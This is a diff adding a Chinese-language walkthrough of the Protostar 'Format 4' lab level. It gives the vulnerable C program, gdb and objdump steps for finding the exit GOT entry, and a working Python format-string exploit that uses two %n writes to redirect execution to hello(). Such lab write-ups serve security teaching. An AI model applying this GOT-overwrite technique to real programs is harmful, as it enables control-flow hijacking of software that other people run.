@@ -375,3 +375,133 @@ $ python -c "print('\xf4\x96\x04\x08' + '%16930112x' + '%12\$n')" | ./format3
                                 0
 you have modified the target :)
 ```
+
+## Format 4
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int target;
+
+void hello()
+{
+  printf("code execution redirected! you win\n");
+  _exit(1);
+}
+
+void vuln()
+{
+  char buffer[512];
+
+  fgets(buffer, sizeof(buffer), stdin);
+
+  printf(buffer);
+
+  exit(1);
+}
+
+int main(int argc, char **argv)
+{
+  vuln();
+}
+```
+
+- 获取 `hello` 函数的地址
+
+    ```bash
+    $ objdump -t format4 | grep hello
+    080484b4 g     F .text	0000001e              hello
+    $ gdb ./format4
+    (gdb) x hello
+    0x80484b4 <hello>:	0x83e58955
+    ```
+
+- 获取 GOT 表 `exit` 函数的条目地址
+
+    ```bash
+    (gdb) set disassembly-flavor intel
+    (gdb) disassemble vuln
+    Dump of assembler code for function vuln:
+    0x080484d2 <vuln+0>:	push   ebp
+    0x080484d3 <vuln+1>:	mov    ebp,esp
+    0x080484d5 <vuln+3>:	sub    esp,0x218
+    0x080484db <vuln+9>:	mov    eax,ds:0x8049730
+    0x080484e0 <vuln+14>:	mov    DWORD PTR [esp+0x8],eax
+    0x080484e4 <vuln+18>:	mov    DWORD PTR [esp+0x4],0x200
+    0x080484ec <vuln+26>:	lea    eax,[ebp-0x208]
+    0x080484f2 <vuln+32>:	mov    DWORD PTR [esp],eax
+    0x080484f5 <vuln+35>:	call   0x804839c <fgets@plt>
+    0x080484fa <vuln+40>:	lea    eax,[ebp-0x208]
+    0x08048500 <vuln+46>:	mov    DWORD PTR [esp],eax
+    0x08048503 <vuln+49>:	call   0x80483cc <printf@plt>
+    0x08048508 <vuln+54>:	mov    DWORD PTR [esp],0x1
+    0x0804850f <vuln+61>:	call   0x80483ec <exit@plt>
+    End of assembler dump.
+    (gdb) disassemble 0x80483ec
+    Dump of assembler code for function exit@plt:
+    0x080483ec <exit@plt+0>:	jmp    DWORD PTR ds:0x8049724
+    0x080483f2 <exit@plt+6>:	push   0x30
+    0x080483f7 <exit@plt+11>:	jmp    0x804837c
+    End of assembler dump.
+    (gdb) x 0x8049724
+    0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483f2
+    ```
+
+- 测试覆盖 `exit` 函数 GOT 表条目跳转 `hello` 函数的可行性
+
+    ```bash
+    (gdb) break *0x08048508
+    Breakpoint 1 at 0x8048508: file format4/format4.c, line 22.
+    (gdb) r
+    Starting program: /opt/protostar/bin/format4 
+    Test input
+    Test input
+
+    Breakpoint 1, vuln () at format4/format4.c:22
+    22	format4/format4.c: No such file or directory.
+      in format4/format4.c
+    (gdb) set {int}0x8049724=0x80484b4
+    (gdb) x 0x8049724
+    0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080484b4
+    (gdb) c
+    Continuing.
+    code execution redirected! you win
+
+    Program exited with code 01.
+    ```
+
+- 观察输入字符串在栈中的位置
+
+    ```bash
+    $ python -c "print('%x ' * 20)" | ./format4
+    200 b7fd8420 bffff524 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 b7ff000a 0
+    ```
+
+- `0x080484b4` 较大，直接通过设置输出最小宽度来补足字符的话打印会消耗较长时间，可以拆分成两部分进行修改
+    - 实际每次修改 $4$ 字节
+
+### Exploit
+
+```py
+import struct
+
+exit_got = 0x08049724
+exploit = ''
+exploit += struct.pack('I', exit_got)
+exploit += struct.pack('I', exit_got + 2)
+exploit += '%33964x' # 0x84b4 - 8
+exploit += '%4$n'
+exploit += '%33616x' # 0x10804 - 0x84b4
+exploit += '%5$n'
+print exploit
+```
+
+```bash
+$ python /tmp/format.py | ./format4
+...
+     b7fd8420
+code execution redirected! you win
+```
